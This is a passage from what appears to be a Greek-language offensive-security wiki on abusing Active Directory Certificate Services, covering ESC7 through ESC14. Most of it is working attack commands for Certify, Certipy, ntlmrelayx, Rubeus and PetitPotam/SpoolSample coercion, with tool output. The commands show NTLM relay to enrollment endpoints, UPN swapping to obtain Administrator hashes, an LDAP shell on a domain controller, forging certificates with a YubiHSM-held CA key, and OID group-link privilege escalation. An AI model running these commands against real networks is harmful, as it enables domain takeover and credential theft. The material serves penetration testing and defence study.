1. **Υποβάλετε μια αίτηση πιστοποιητικού που θα παραμείνει *εκκρεμής*.** Αυτό μπορεί να επιβληθεί με ένα template που απαιτεί manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Προσθέστε μια custom επέκταση στην εκκρεμή αίτηση** χρησιμοποιώντας την νέα εντολή `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*

3. **Εκδώστε την αίτηση** (εάν ο ρόλος σας επίσης έχει δικαιώματα έγκρισης *Manage Certificates*) ή περιμένετε έναν χειριστή να την εγκρίνει. Μόλις εκδοθεί, κατεβάστε το πιστοποιητικό:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Το προκύπτον πιστοποιητικό πλέον περιέχει το κακόβουλο issuance-policy OID και μπορεί να χρησιμοποιηθεί σε επακόλουθες επιθέσεις (π.χ. ESC13, domain escalation, κ.λπ.).

> ΣΗΜΕΙΩΣΗ: Η ίδια επίθεση μπορεί να εκτελεστεί με Certipy ≥ 4.7 μέσω της εντολής `ca` και του παραμέτρου `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Εξήγηση

> [!TIP]
> Σε περιβάλλοντα όπου είναι εγκατεστημένο το **AD CS**, εάν υπάρχει κάποιο **web enrollment endpoint** ευάλωτο και τουλάχιστον ένα **certificate template** έχει δημοσιευτεί που επιτρέπει **domain computer enrollment και client authentication** (όπως το προεπιλεγμένο **`Machine`** template), γίνεται δυνατό για **οποιονδήποτε υπολογιστή με ενεργή την spooler service να συμβιβαστεί από έναν επιτιθέμενο**!

Υποστηρίζονται διάφορες **HTTP-based enrollment methods** από το AD CS, διαθέσιμες μέσω πρόσθετων server roles που οι διαχειριστές μπορεί να εγκαταστήσουν. Αυτές οι διεπιφάνειες για HTTP-based certificate enrollment είναι επιρρεπείς σε **NTLM relay attacks**. Ένας επιτιθέμενος, από ένα **συμβιβασμένο μηχάνημα, μπορεί να μιμηθεί οποιονδήποτε AD account που κάνει authentication μέσω εισερχόμενου NTLM**. Ενώ μιμείται τον λογαριασμό του θύματος, αυτές οι web διεπαφές μπορεί να χρησιμοποιηθούν από τον επιτιθέμενο για να **αιτηθεί ένα client authentication certificate χρησιμοποιώντας τα `User` ή `Machine` certificate templates**.

- Η **web enrollment interface** (μια παλαιότερη ASP εφαρμογή διαθέσιμη στο `http://<caserver>/certsrv/`), προεπιλεγμένα χρησιμοποιεί μόνο HTTP, το οποίο δεν προσφέρει προστασία ενάντια σε NTLM relay attacks. Επιπλέον, επιτρέπει ρητά μόνο NTLM authentication μέσω της Authorization HTTP header, καθιστώντας πιο ασφαλείς μεθόδους όπως το Kerberos μη εφαρμόσιμες.
- Η **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, και το **Network Device Enrollment Service** (NDES) υποστηρίζουν προεπιλεγμένα negotiate authentication μέσω της Authorization HTTP header. Το negotiate authentication **υποστηρίζει τόσο** Kerberos όσο και **NTLM**, επιτρέποντας σε έναν επιτιθέμενο να **κατεβάσει σε NTLM** authentication κατά τη διάρκεια relay attacks. Παρόλο που αυτές οι web υπηρεσίες ενεργοποιούν HTTPS από προεπιλογή, το HTTPS από μόνο του **δεν προστατεύει από NTLM relay attacks**. Η προστασία από NTLM relay attacks για υπηρεσίες HTTPS είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με channel binding. Δυστυχώς, το AD CS δεν ενεργοποιεί το Extended Protection for Authentication στο IIS, που απαιτείται για channel binding.

Ένα κοινό **πρόβλημα** με τα NTLM relay attacks είναι η **σύντομη διάρκεια των NTLM sessions** και η αδυναμία του επιτιθέμενου να αλληλεπιδράσει με υπηρεσίες που **απαιτούν NTLM signing**.

Παρόλα αυτά, αυτός ο περιορισμός ξεπερνιέται με την εκμετάλλευση ενός NTLM relay attack για την απόκτηση ενός πιστοποιητικού για τον χρήστη, καθώς η περίοδος ισχύος του πιστοποιητικού καθορίζει τη διάρκεια της συνεδρίας, και το πιστοποιητικό μπορεί να χρησιμοποιηθεί με υπηρεσίες που **απαιτούν NTLM signing**. Για οδηγίες σχετικά με τη χρήση ενός κλεμμένου πιστοποιητικού, ανατρέξτε σε:


{{#ref}}
account-persistence.md
{{#endref}}

Ένας ακόμη περιορισμός των NTLM relay attacks είναι ότι **ένα μηχάνημα ελεγχόμενο από τον επιτιθέμενο πρέπει να πιστοποιηθεί από έναν λογαριασμό θύματος**. Ο επιτιθέμενος μπορεί είτε να περιμένει είτε να προσπαθήσει να **αναγκάσει** αυτή την πιστοποίηση:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Κατάχρηση**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από τις εταιρικές Certificate Authorities (CAs) για την αποθήκευση των endpoints του Certificate Enrollment Service (CES). Αυτά τα endpoints μπορούν να αναλυθούν και να απαριθμηθούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για πιστοποιητικό γίνεται από το Certipy εξ ορισμού βάσει του προτύπου `Machine` ή `User`, ανάλογα με το αν το όνομα του λογαριασμού που προωθείται τελειώνει σε `$`. Ο καθορισμός ενός εναλλακτικού προτύπου μπορεί να επιτευχθεί μέσω της χρήσης της παραμέτρου `-template`.

Μια τεχνική όπως [PetitPotam](https://github.com/ly4k/PetitPotam) μπορεί στη συνέχεια να χρησιμοποιηθεί για να εξαναγκάσει την αυθεντικοποίηση. Όταν πρόκειται για domain controllers, απαιτείται ο ορισμός `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Χωρίς Επέκταση Ασφαλείας - ESC9 <a href="#id-5485" id="id-5485"></a>

### Εξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, γνωστή ως ESC9, αποτρέπει την ενσωμάτωση της **νέας επέκτασης ασφαλείας `szOID_NTDS_CA_SECURITY_EXT`** σε ένα πιστοποιητικό. Αυτή η σημαία γίνεται σημαντική όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο στο `1` (η προεπιλεγμένη τιμή), σε αντίθεση με τη ρύθμιση `2`. Η σημασία της ενισχύεται σε σενάρια όπου μια ασθενέστερη συσχέτιση πιστοποιητικού για Kerberos ή Schannel μπορεί να εκμεταλλευτεί (όπως στο ESC10), δεδομένου ότι η απουσία του ESC9 δεν θα άλλαζε τις απαιτήσεις.

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτής της σημαίας γίνεται σημαντική περιλαμβάνουν:

- Το `StrongCertificateBindingEnforcement` να μην έχει ρυθμιστεί στο `2` (με προεπιλογή το `1`), ή το `CertificateMappingMethods` να περιλαμβάνει τη σημαία `UPN`.
- Το πιστοποιητικό να είναι επισημασμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` μέσα στη ρύθμιση `msPKI-Enrollment-Flag`.
- Το πιστοποιητικό να καθορίζει οποιοδήποτε client authentication EKU.
- Υπάρχουν δικαιώματα `GenericWrite` σε οποιονδήποτε λογαριασμό που επιτρέπουν την προσβολή άλλου.

### Σενάριο Κατάχρησης

Ας υποθέσουμε ότι ο `John@corp.local` κατέχει δικαιώματα `GenericWrite` πάνω στον `Jane@corp.local`, με στόχο να υποκλέψει τον `Administrator@corp.local`. Το πρότυπο πιστοποιητικού `ESC9`, στο οποίο ο `Jane@corp.local` επιτρέπεται να εγγραφεί, είναι ρυθμισμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, το hash της `Jane` αποκτάται χρησιμοποιώντας Shadow Credentials, χάρη στα `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, εσκεμμένα παραλείποντας το μέρος του domain `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, δεδομένου ότι το `Administrator@corp.local` παραμένει ξεχωριστό ως `Administrator`'s `userPrincipalName`.

Κατόπιν αυτού, το πρότυπο πιστοποιητικού `ESC9`, επισημασμένο ως ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντικατοπτρίζει `Administrator`, χωρίς κανένα “object SID”.

Το `userPrincipalName` της `Jane` στη συνέχεια επαναφέρεται στο αρχικό της, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια αυθεντικοποίησης με το εκδοθέν πιστοποιητικό τώρα επιστρέφει το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει `-domain <domain>` επειδή το πιστοποιητικό δεν περιέχει καθορισμένο domain:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Αδύναμες Αντιστοιχίσεις Πιστοποιητικών - ESC10

### Εξήγηση

Δύο τιμές κλειδιών μητρώου στον domain controller αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` στο `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), προηγουμένως ορισμένη σε `0x1F`.
- Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` στο `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, προηγουμένως `0`.

### Περίπτωση 1

Όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `0`.

### Περίπτωση 2

Εάν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση Κατάχρησης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να χρησιμοποιηθεί για την παραβίαση οποιουδήποτε λογαριασμού B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω στο `Jane@corp.local`, ένας επιτιθέμενος στοχεύει να παραβιάσει το `Administrator@corp.local`. Η διαδικασία αντανακλά το ESC9, επιτρέποντας τη χρήση οποιουδήποτε προτύπου πιστοποιητικού.

Αρχικά, το hash της `Jane` ανακτάται χρησιμοποιώντας Shadow Credentials, εκμεταλλευόμενο το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` αλλάζεται σε `Administrator`, σκόπιμα παραλείποντας το τμήμα `@corp.local` για να αποφευχθεί μια παραβίαση περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Στη συνέχεια, ζητείται ένα πιστοποιητικό που επιτρέπει την αυθεντικοποίηση πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` στη συνέχεια επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η αυθεντικοποίηση με το αποκτηθέν πιστοποιητικό θα αποδώσει το NT hash του `Administrator@corp.local`, απαιτώντας να καθοριστεί το domain στην εντολή λόγω της έλλειψης στοιχείων domain στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Περίπτωση Κατάχρησης 2

Με το `CertificateMappingMethods` να περιέχει τη σημαία bit `UPN` (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να συμβιβάσει οποιονδήποτε λογαριασμό B που δεν διαθέτει ιδιότητα `userPrincipalName`, συμπεριλαμβανομένων των machine accounts και του built-in domain administrator `Administrator`.

Εδώ, ο στόχος είναι να συμβιβαστεί ο `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω Shadow Credentials, αξιοποιώντας το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` τότε ορίζεται σε `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ένα πιστοποιητικό για ταυτοποίηση πελάτη ζητήθηκε ως `Jane` χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επανέρχεται στην αρχική του τιμή μετά από αυτή τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για να γίνει αυθεντικοποίηση μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας επιτυχή αυθεντικοποίηση ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), που ενδέχεται να παραβιάσουν τον domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη που δεν διαθέτει `userPrincipalName` ή όπου αυτό δεν ταιριάζει με το `sAMAccountName`, με τον προεπιλεγμένο `Administrator@corp.local` να αποτελεί κύριο στόχο λόγω των αυξημένων προνομίων LDAP και της απουσίας `userPrincipalName` από προεπιλογή.

## Relaying NTLM to ICPR - ESC11

### Explanation

Εάν ο CA Server δεν είναι ρυθμισμένος με το `IF_ENFORCEENCRYPTICERTREQUEST`, αυτό μπορεί να επιτρέψει NTLM relay attacks χωρίς signing μέσω της υπηρεσίας RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Μπορείτε να χρησιμοποιήσετε το `certipy` για να εντοπίσετε εάν το `Enforce Encryption for Requests` είναι Disabled και το certipy θα εμφανίσει τις `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Σενάριο Κατάχρησης

Χρειάζεται να ρυθμίσει έναν relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Σημείωση: Για τους domain controllers, πρέπει να ορίσουμε `-template` στο DomainController.

Ή χρησιμοποιώντας [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Εξήγηση

Οι διαχειριστές μπορούν να ρυθμίσουν την Certificate Authority ώστε να αποθηκεύεται σε εξωτερική συσκευή όπως το "Yubico YubiHSM2".

Εάν η USB συσκευή είναι συνδεδεμένη στον CA server μέσω θύρας USB, ή σε USB device server στην περίπτωση που ο CA server είναι virtual machine, απαιτείται ένα authentication key (μερικές φορές αναφερόμενο ως "password") για τον Key Storage Provider ώστε να δημιουργεί και να χρησιμοποιεί κλειδιά στο YubiHSM.

Αυτό το key/password αποθηκεύεται στο registry υπό `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` σε απλό κείμενο.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Σενάριο Κατάχρησης

Εάν το ιδιωτικό κλειδί της CA είναι αποθηκευμένο σε φυσική USB συσκευή όταν έχετε πρόσβαση σε shell, είναι δυνατό να ανακτηθεί το κλειδί.

Αρχικά, πρέπει να αποκτήσετε το πιστοποιητικό της CA (αυτό είναι δημόσιο) και στη συνέχεια:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Τέλος, χρησιμοποιήστε την εντολή certutil `-sign` για να πλαστογραφήσετε ένα νέο αυθαίρετο πιστοποιητικό χρησιμοποιώντας το πιστοποιητικό CA και το ιδιωτικό του κλειδί.

## OID Group Link Abuse - ESC13

### Εξήγηση

Η ιδιότητα `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της πολιτικής έκδοσης στο πρότυπο πιστοποιητικού. Τα αντικείμενα `msPKI-Enterprise-Oid` που είναι υπεύθυνα για τις πολιτικές έκδοσης μπορούν να εντοπιστούν στο Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) του PKI OID container. Μια πολιτική μπορεί να συσχετιστεί με μια AD group χρησιμοποιώντας την ιδιότητα `msDS-OIDToGroupLink` αυτού του αντικειμένου, επιτρέποντας σε ένα σύστημα να εξουσιοδοτήσει έναν χρήστη που παρουσιάζει το πιστοποιητικό σαν να ήταν μέλος της ομάδας. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Με άλλα λόγια, όταν ένας χρήστης έχει άδεια να εγγραφεί για ένα πιστοποιητικό και το πιστοποιητικό είναι συνδεδεμένο με μια OID group, ο χρήστης μπορεί να κληρονομήσει τα προνόμια αυτής της ομάδας.

Χρησιμοποιήστε [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να βρείτε το OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Σενάριο Κατάχρησης

Βρείτε ένα δικαίωμα χρήστη που μπορείτε να χρησιμοποιήσετε με `certipy find` ή `Certify.exe find /showAllPermissions`.

Αν ο `John` έχει δικαίωμα εγγραφής στο `VulnerableTemplate`, ο χρήστης μπορεί να κληρονομήσει τα προνόμια της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το template, και θα λάβει ένα πιστοποιητικό με δικαιώματα OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ευπαθής Διαμόρφωση Ανανέωσης Πιστοποιητικών - ESC14

### Εξήγηση

Η περιγραφή στο https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping είναι εξαιρετικά αναλυτική. Παρακάτω υπάρχει απόσπασμα του αρχικού κειμένου.

Το ESC14 αντιμετωπίζει ευπάθειες που προκύπτουν από "weak explicit certificate mapping", κυρίως λόγω κακής χρήσης ή ανασφαλούς διαμόρφωσης του χαρακτηριστικού `altSecurityIdentities` σε λογαριασμούς χρήστη ή υπολογιστή στο Active Directory. Αυτό το πολυτιμημένο (multi-valued) χαρακτηριστικό επιτρέπει στους διαχειριστές να συσχετίζουν χειροκίνητα X.509 certificates με έναν AD account για σκοπούς authentication. Όταν είναι συμπληρωμένο, αυτές οι explicit mappings μπορούν να υπερισχύσουν της προεπιλεγμένης λογικής αντιστοίχισης πιστοποιητικών, η οποία συνήθως βασίζεται σε UPNs ή DNS names στο SAN του πιστοποιητικού, ή στο SID ενσωματωμένο στην `szOID_NTDS_CA_SECURITY_EXT` security extension.

Μια "weak" mapping συμβαίνει όταν η τιμή συμβολοσειράς που χρησιμοποιείται μέσα στο `altSecurityIdentities` για να αναγνωρίσει ένα πιστοποιητικό είναι πολύ ευρεία, εύκολα μαντέψιμη, βασίζεται σε μη μοναδικά πεδία πιστοποιητικού, ή χρησιμοποιεί εύκολα spoofable συστατικά πιστοποιητικού. Εάν ένας επιτιθέμενος μπορεί να αποκτήσει ή να κατασκευάσει ένα πιστοποιητικό του οποίου τα attributes ταιριάζουν με μια τέτοια αδύναμα καθορισμένη explicit mapping για έναν privileged account, μπορεί να χρησιμοποιήσει αυτό το πιστοποιητικό για να authentication και να προσποιηθεί ότι είναι αυτός ο account.

Παραδείγματα πιθανώς αδύναμων `altSecurityIdentities` mapping strings περιλαμβάνουν:

- Mapping αποκλειστικά βάσει ενός κοινού Subject Common Name (CN): π.χ., `X509:<S>CN=SomeUser`. Ένας επιτιθέμενος ίσως να είναι σε θέση να αποκτήσει ένα πιστοποιητικό με αυτό το CN από μια λιγότερο ασφαλή πηγή.
- Χρήση υπερβολικά γενικών Issuer Distinguished Names (DNs) ή Subject DNs χωρίς περαιτέρω προσδιορισμό όπως συγκεκριμένο serial number ή subject key identifier: π.χ., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Εφαρμογή άλλων προβλέψιμων προτύπων ή μη-κρυπτογραφικών αναγνωριστικών που ένας επιτιθέμενος μπορεί να ικανοποιήσει σε ένα πιστοποιητικό που μπορεί νόμιμα να αποκτήσει ή να πλαστογραφήσει (εάν έχει kompromised μια CA ή βρει ένα ευάλωτο template όπως στο ESC1).

Το χαρακτηριστικό `altSecurityIdentities` υποστηρίζει διάφορες μορφές για mapping, όπως:

- `X509:<I>IssuerDN<S>SubjectDN` (χαρτογραφεί βάσει πλήρους Issuer και Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (χαρτογραφεί βάσει της τιμής του Subject Key Identifier extension του πιστοποιητικού)
- `X509:<SR>SerialNumberBackedByIssuerDN` (χαρτογραφεί βάσει serial number, με implicit qualification από το Issuer DN) - αυτό δεν είναι τυπική μορφή, συνήθως είναι `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (χαρτογραφεί βάσει ενός RFC822 ονόματος, συνήθως διεύθυνση email, από το SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (χαρτογραφεί βάσει ενός SHA1 hash του raw public key του πιστοποιητικού - γενικά ισχυρό)

Η ασφάλεια αυτών των mappings εξαρτάται σε μεγάλο βαθμό από τη συγκεκριμενοποίηση, μοναδικότητα και κρυπτογραφική ισχύ των επιλεγμένων αναγνωριστικών πιστοποιητικών που χρησιμοποιούνται στη συμβολοσειρά mapping. Ακόμα και με ενεργοποιημένα τα strong certificate binding modes στους Domain Controllers (που επηρεάζουν κυρίως implicit mappings βάσει SAN UPNs/DNS και της SID extension), μια κακώς διαμορφωμένη `altSecurityIdentities` εγγραφή μπορεί να παραμείνει άμεση οδός για impersonation αν η ίδια η λογική mapping είναι ελαττωματική ή υπερβολικά επιεικής.

### Σενάριο Κατάχρησης

Το ESC14 στοχεύει τις **explicit certificate mappings** στο Active Directory (AD), συγκεκριμένα το χαρακτηριστικό `altSecurityIdentities`. Εάν αυτό το χαρακτηριστικό είναι ρυθμισμένο (εξ αμελείας ή κακόβουλα), οι επιτιθέμενοι μπορούν να προσποιηθούν λογαριασμούς παρουσιάζοντας πιστοποιητικά που ταιριάζουν με την mapping.

#### Σενάριο A: Ο επιτιθέμενος μπορεί να γράψει στο `altSecurityIdentities`

**Προϋπόθεση**: Ο επιτιθέμενος έχει δικαιώματα εγγραφής στο `altSecurityIdentities` του στοχευόμενου account ή το δικαίωμα να το χορηγήσει με τη μορφή ενός από τα ακόλουθα δικαιώματα στο στοχευόμενο AD αντικείμενο:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Σενάριο B: Ο στόχος έχει αδύναμη mapping μέσω X509RFC822 (Email)

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509RFC822 mapping στο altSecurityIdentities. Ένας επιτιθέμενος μπορεί να θέσει το mail attribute του θύματος ώστε να ταιριάξει με το X509RFC822 όνομα του στόχου, να εγγραφεί (enroll) ένα πιστοποιητικό ως το θύμα, και να το χρησιμοποιήσει για authentication ως ο στόχος.

#### Σενάριο C: Ο στόχος έχει X509IssuerSubject Mapping

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509IssuerSubject explicit mapping στο `altSecurityIdentities`. Ο επιτιθέμενος μπορεί να θέσει το `cn` ή το `dNSHostName` attribute σε έναν victim principal ώστε να ταιριάξει με το subject της X509IssuerSubject mapping του στόχου. Στη συνέχεια, ο επιτιθέμενος μπορεί να εγγραφεί (enroll) ένα πιστοποιητικό ως το θύμα και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο στόχος.

#### Σενάριο D: Ο στόχος έχει X509SubjectOnly Mapping

- **Προϋπόθεση**: Ο στόχος έχει μια αδύναμη X509SubjectOnly explicit mapping στο `altSecurityIdentities`. Ο επιτιθέμενος μπορεί να θέσει το `cn` ή το `dNSHostName` attribute σε έναν victim principal ώστε να ταιριάξει με το subject της X509SubjectOnly mapping του στόχου. Στη συνέχεια, ο επιτιθέμενος μπορεί να εγγραφεί (enroll) ένα πιστοποιητικό ως το θύμα και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο στόχος.

### συγκεκριμένες ενέργειες
#### Σενάριο A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Αποθήκευση και μετατροπή του πιστοποιητικού
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Αυθεντικοποίηση (χρησιμοποιώντας το πιστοποιητικό)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Καθαρισμός (προαιρετικό)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
